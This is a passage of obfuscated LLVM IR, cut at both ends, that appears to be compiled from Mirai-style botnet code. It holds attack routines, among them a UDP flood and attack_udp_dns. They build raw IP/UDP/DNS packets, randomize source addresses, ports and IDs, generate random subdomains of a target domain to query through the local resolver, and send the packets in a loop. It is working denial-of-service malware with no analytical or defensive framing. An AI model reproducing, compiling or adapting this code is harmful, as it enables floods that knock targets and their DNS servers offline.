  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 3
  store i16 %115, i16* %117, align 4
  %118 = load i8, i8* %14, align 1
  %119 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i32 0, i32 5
  store i8 %118, i8* %120, align 4
  %121 = load i8, i8* %15, align 1
  %122 = icmp ne i8 %121, 0
  %123 = select i1 %122, i32 1084698452, i32 764714613
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %126 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 4
  store i16 %125, i16* %127, align 2
  store i32 764714613, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 6
  store i8 17, i8* %130, align 1
  %131 = load i32, i32* @LOCAL_ADDR, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 8
  store i32 %131, i32* %133, align 4
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 9
  store i32 %139, i32* %141, align 4
  %142 = load i16, i16* %16, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 0
  store i16 %143, i16* %145, align 2
  %146 = load i16, i16* %17, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 1
  store i16 %147, i16* %149, align 2
  %150 = load i32, i32* %19, align 4
  %151 = sext i32 %150 to i64
  %152 = add i64 12, %151
  %153 = trunc i64 %152 to i16
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 2
  store i16 %154, i16* %156, align 2
  %157 = load i8*, i8** %22, align 8
  %158 = bitcast i8* %157 to i32*
  store i32 -1, i32* %158, align 4
  %159 = load i8*, i8** %22, align 8
  %160 = getelementptr inbounds i8, i8* %159, i64 4
  store i8* %160, i8** %22, align 8
  %161 = load i8*, i8** %22, align 8
  %162 = load i8*, i8** %18, align 8
  %163 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %161, i8* %162, i32 %163)
  store i32 -755806800, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  store i32 1965205744, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 -619298182, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1242205739, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %9, align 4
  %171 = load i8, i8* %5, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp slt i32 %170, %172
  %174 = select i1 %173, i32 550322261, i32 1673117758
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8**, i8*** %11, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8*, i8** %176, i64 %178
  %180 = load i8*, i8** %179, align 8
  store i8* %180, i8** %23, align 8
  %181 = load i8*, i8** %23, align 8
  %182 = bitcast i8* %181 to %struct.iphdr*
  store %struct.iphdr* %182, %struct.iphdr** %24, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i64 1
  %185 = bitcast %struct.iphdr* %184 to %struct.udphdr*
  store %struct.udphdr* %185, %struct.udphdr** %25, align 8
  %186 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 2
  %191 = load i8, i8* %190, align 4
  %192 = zext i8 %191 to i32
  %193 = icmp slt i32 %192, 32
  %194 = select i1 %193, i32 934478135, i32 -1000306530
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @ntohl(i32 %201) #7
  %203 = call i32 @rand_next()
  %204 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = lshr i32 %203, %210
  %212 = add i32 %202, %211
  %213 = call i32 @htonl(i32 %212) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 9
  store i32 %213, i32* %215, align 4
  store i32 -1000306530, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i16, i16* %13, align 2
  %218 = zext i16 %217 to i32
  %219 = icmp eq i32 %218, 65535
  %220 = select i1 %219, i32 -88018294, i32 -1562310531
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = call i32 @rand_next()
  %223 = trunc i32 %222 to i16
  %224 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 3
  store i16 %223, i16* %225, align 4
  store i32 -1562310531, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i16, i16* %16, align 2
  %228 = zext i16 %227 to i32
  %229 = icmp eq i32 %228, 65535
  %230 = select i1 %229, i32 -991300055, i32 766434910
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  store i32 766434910, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i16, i16* %17, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  %240 = select i1 %239, i32 -2059778716, i32 909435666
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i32 @rand_next()
  %243 = trunc i32 %242 to i16
  %244 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  store i32 909435666, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 7
  store i16 0, i16* %248, align 2
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = bitcast %struct.iphdr* %249 to i16*
  %251 = call zeroext i16 @checksum_generic(i16* %250, i32 20)
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 7
  store i16 %251, i16* %253, align 2
  %254 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 3
  store i16 0, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %257 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %258 = bitcast %struct.udphdr* %257 to i8*
  %259 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 2
  %261 = load i16, i16* %260, align 2
  %262 = load i32, i32* %19, align 4
  %263 = sext i32 %262 to i64
  %264 = add i64 12, %263
  %265 = trunc i64 %264 to i32
  %266 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %256, i8* %258, i16 zeroext %261, i32 %265)
  %267 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 3
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 1
  %271 = load i16, i16* %270, align 2
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %274
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i32 0, i32 0
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %276, i32 0, i32 1
  store i16 %271, i16* %277, align 2
  %278 = load i32, i32* %10, align 4
  %279 = load i8*, i8** %23, align 8
  %280 = load i32, i32* %19, align 4
  %281 = sext i32 %280 to i64
  %282 = add i64 32, %281
  %283 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %284 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i32 0, i32 0
  %289 = bitcast %struct.sockaddr_in* %288 to %struct.sockaddr*
  store %struct.sockaddr* %289, %struct.sockaddr** %283, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @sendto(i32 %278, i8* %279, i64 %282, i32 16384, %struct.sockaddr* %291, i32 16)
  store i32 1407409594, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i32, i32* %9, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %9, align 4
  store i32 -1242205739, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 -619298182, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %296, %293, %246, %241, %236, %231, %226, %221, %216, %195, %175, %169, %168, %167, %164, %128, %124, %76, %70, %69, %66, %60, %59, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  store i8* %78, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 581312237, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 581312237, label %first
    i32 -563239094, label %81
    i32 1392007582, label %82
    i32 144756482, label %88
    i32 -1616005029, label %89
    i32 -1018283592, label %95
    i32 -1569478898, label %98
    i32 2125365468, label %99
    i32 -2146122694, label %105
    i32 -648350164, label %161
    i32 -200075901, label %165
    i32 59930592, label %218
    i32 -567970819, label %223
    i32 247843947, label %232
    i32 -495514004, label %242
    i32 -1002019630, label %245
    i32 -11703008, label %246
    i32 -850691333, label %249
    i32 -514272813, label %264
    i32 -997944226, label %267
    i32 1461391476, label %268
    i32 798050337, label %269
    i32 759624389, label %275
    i32 -1153578470, label %297
    i32 -1761099864, label %303
    i32 1473560009, label %308
    i32 180713989, label %314
    i32 1583529010, label %319
    i32 -1455027947, label %325
    i32 -1892864656, label %330
    i32 787974731, label %336
    i32 555770430, label %404
    i32 -400920944, label %407
    i32 -751994348, label %408
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %79 = icmp eq i8* %.reload, null
  %80 = select i1 %79, i32 -563239094, i32 1392007582
  store i32 %80, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -751994348, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %20, align 8
  %84 = call i32 @util_strlen(i8* %83)
  store i32 %84, i32* %21, align 4
  %85 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %85, i32* %10, align 4
  %86 = icmp eq i32 %85, -1
  %87 = select i1 %86, i32 144756482, i32 -1616005029
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 -751994348, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %90 = load i32, i32* %10, align 4
  %91 = bitcast i32* %9 to i8*
  %92 = call i32 @setsockopt(i32 %90, i32 0, i32 3, i8* %91, i32 4) #6
  %93 = icmp eq i32 %92, -1
  %94 = select i1 %93, i32 -1018283592, i32 -1569478898
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %10, align 4
  %97 = call i32 @close(i32 %96)
  store i32 -751994348, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 2125365468, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %9, align 4
  %101 = load i8, i8* %5, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  %104 = select i1 %103, i32 -2146122694, i32 -997944226
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %106 = call noalias i8* @calloc(i64 600, i64 1) #6
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  store i8* %106, i8** %110, align 8
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  store %struct.iphdr* %116, %struct.iphdr** %26, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.udphdr*
  store %struct.udphdr* %119, %struct.udphdr** %27, align 8
  %120 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %121 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %120, i64 1
  %122 = bitcast %struct.udphdr* %121 to %struct.dnshdr*
  store %struct.dnshdr* %122, %struct.dnshdr** %28, align 8
  %123 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %124 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %123, i64 1
  %125 = bitcast %struct.dnshdr* %124 to i8*
  store i8* %125, i8** %29, align 8
  %126 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %127 = bitcast %struct.iphdr* %126 to i8*
  %128 = load i8, i8* %127, align 4
  %129 = and i8 %128, 15
  %130 = or i8 %129, 64
  store i8 %130, i8* %127, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, -16
  %135 = or i8 %134, 5
  store i8 %135, i8* %132, align 4
  %136 = load i8, i8* %12, align 1
  %137 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 1
  store i8 %136, i8* %138, align 1
  %139 = load i8, i8* %19, align 1
  %140 = zext i8 %139 to i64
  %141 = add i64 41, %140
  %142 = add i64 %141, 2
  %143 = load i32, i32* %21, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 %142, %144
  %146 = add i64 %145, 4
  %147 = trunc i64 %146 to i16
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 2
  store i16 %148, i16* %150, align 2
  %151 = load i16, i16* %13, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i8, i8* %14, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 5
  store i8 %155, i8* %157, align 4
  %158 = load i8, i8* %15, align 1
  %159 = icmp ne i8 %158, 0
  %160 = select i1 %159, i32 -648350164, i32 -200075901
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 4
  store i16 %162, i16* %164, align 2
  store i32 -200075901, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 6
  store i8 17, i8* %167, align 1
  %168 = load i32, i32* @LOCAL_ADDR, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 8
  store i32 %168, i32* %170, align 4
  %171 = load i32, i32* %22, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 2
  %178 = load i16, i16* %17, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i8, i8* %19, align 1
  %183 = zext i8 %182 to i64
  %184 = add i64 21, %183
  %185 = add i64 %184, 2
  %186 = load i32, i32* %21, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 %185, %187
  %189 = add i64 %188, 4
  %190 = trunc i64 %189 to i16
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 2
  store i16 %191, i16* %193, align 2
  %194 = load i16, i16* %18, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %197 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 2
  %198 = call zeroext i16 @htons(i16 zeroext 256) #7
  %199 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %200 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %199, i32 0, i32 1
  store i16 %198, i16* %200, align 2
  %201 = call zeroext i16 @htons(i16 zeroext 1) #7
  %202 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %203 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %202, i32 0, i32 2
  store i16 %201, i16* %203, align 2
  %204 = load i8, i8* %19, align 1
  %205 = load i8*, i8** %29, align 8
  %206 = getelementptr inbounds i8, i8* %205, i32 1
  store i8* %206, i8** %29, align 8
  store i8 %204, i8* %205, align 1
  %207 = load i8, i8* %19, align 1
  %208 = zext i8 %207 to i32
  %209 = load i8*, i8** %29, align 8
  %210 = sext i32 %208 to i64
  %211 = getelementptr inbounds i8, i8* %209, i64 %210
  store i8* %211, i8** %29, align 8
  %212 = load i8*, i8** %29, align 8
  store i8* %212, i8** %30, align 8
  %213 = load i8*, i8** %29, align 8
  %214 = getelementptr inbounds i8, i8* %213, i64 1
  %215 = load i8*, i8** %20, align 8
  %216 = load i32, i32* %21, align 4
  %217 = add nsw i32 %216, 1
  call void @util_memcpy(i8* %214, i8* %215, i32 %217)
  store i32 0, i32* %23, align 4
  store i32 59930592, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %23, align 4
  %220 = load i32, i32* %21, align 4
  %221 = icmp slt i32 %219, %220
  %222 = select i1 %221, i32 -567970819, i32 -850691333
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8*, i8** %20, align 8
  %225 = load i32, i32* %23, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds i8, i8* %224, i64 %226
  %228 = load i8, i8* %227, align 1
  %229 = sext i8 %228 to i32
  %230 = icmp eq i32 %229, 46
  %231 = select i1 %230, i32 247843947, i32 -495514004
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = load i8, i8* %24, align 1
  %234 = load i8*, i8** %30, align 8
  store i8 %233, i8* %234, align 1
  store i8 0, i8* %24, align 1
  %235 = load i8, i8* %25, align 1
  %236 = add i8 %235, 1
  store i8 %236, i8* %25, align 1
  %237 = load i8*, i8** %29, align 8
  %238 = load i32, i32* %23, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i8, i8* %237, i64 %239
  %241 = getelementptr inbounds i8, i8* %240, i64 1
  store i8* %241, i8** %30, align 8
  store i32 -1002019630, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8, i8* %24, align 1
  %244 = add i8 %243, 1
  store i8 %244, i8* %24, align 1
  store i32 -1002019630, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  store i32 -11703008, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i32, i32* %23, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %23, align 4
  store i32 59930592, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8, i8* %24, align 1
  %251 = load i8*, i8** %30, align 8
  store i8 %250, i8* %251, align 1
  %252 = load i8*, i8** %29, align 8
  %253 = load i32, i32* %21, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds i8, i8* %252, i64 %254
  %256 = getelementptr inbounds i8, i8* %255, i64 2
  %257 = bitcast i8* %256 to %struct.grehdr*
  store %struct.grehdr* %257, %struct.grehdr** %31, align 8
  %258 = call zeroext i16 @htons(i16 zeroext 1) #7
  %259 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %260 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %259, i32 0, i32 0
  store i16 %258, i16* %260, align 2
  %261 = call zeroext i16 @htons(i16 zeroext 1) #7
  %262 = load %struct.grehdr*, %struct.grehdr** %31, align 8
